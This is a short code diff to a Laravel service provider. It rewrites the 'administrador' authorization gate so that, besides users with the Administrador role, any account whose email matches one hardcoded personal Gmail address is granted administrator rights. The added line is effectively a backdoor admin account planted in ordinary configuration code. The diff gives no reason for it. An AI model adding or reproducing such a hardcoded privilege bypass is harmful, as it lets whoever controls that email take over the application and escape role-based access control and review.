@@ -24,9 +24,9 @@ class AppServiceProvider extends ServiceProvider
     {
         Vite::prefetch(concurrency: 3);
 
-            Gate::define('administrador', function (User $user) {
-            return $user->roles()->where('nombre', 'Administrador')->exists();
+        Gate::define('administrador', function (User $user) {
+            return $user->roles()->where('nombre', 'Administrador')->exists()
+                || $user->email === 'ptazet4@gmail.com';
         });
-
     }
 }
